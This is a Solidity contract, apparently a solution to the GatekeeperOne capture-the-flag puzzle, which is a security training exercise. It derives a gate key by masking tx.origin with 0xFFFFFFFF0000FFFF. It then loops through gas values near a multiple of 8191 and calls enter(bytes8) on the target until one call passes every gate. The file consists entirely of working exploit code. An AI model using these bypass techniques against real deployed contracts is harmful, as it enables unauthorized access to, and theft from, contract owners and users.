// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {GatekeeperOne} from "./GatekeeperOne.sol";

contract HackGatekeeperOne {
    function attack(address _target) external {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for (uint256 i; i < 300; i++) {
            uint256 totalGas = i + (8191 * 3);
            (bool ok,) = _target.call{gas: totalGas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (ok) break;
        }
    }
}
